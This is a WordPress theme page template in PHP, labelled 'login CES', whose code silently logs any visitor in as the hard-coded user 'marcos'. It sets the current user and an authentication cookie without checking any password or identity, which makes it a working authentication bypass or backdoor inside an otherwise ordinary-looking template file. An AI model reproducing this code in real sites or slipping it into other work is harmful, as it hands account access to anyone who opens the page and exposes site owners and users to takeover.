<?php
/**
 * Template name: login CES
 *
 * This is the template that displays all pages by default.
 * Please note that this is the WordPress construct of pages
 * and that other 'pages' on your WordPress site may use a
 * different template.
 *
 * @link https://developer.wordpress.org/themes/basics/template-hierarchy/
 *
 * @package craed_duoc_uc
 */

 $user_login = 'marcos';

 $user = get_userdatabylogin($user_login);
 $user_id = $user->ID;
 wp_set_current_user($user_id, $user_login);
 wp_set_auth_cookie($user_id);

get_footer();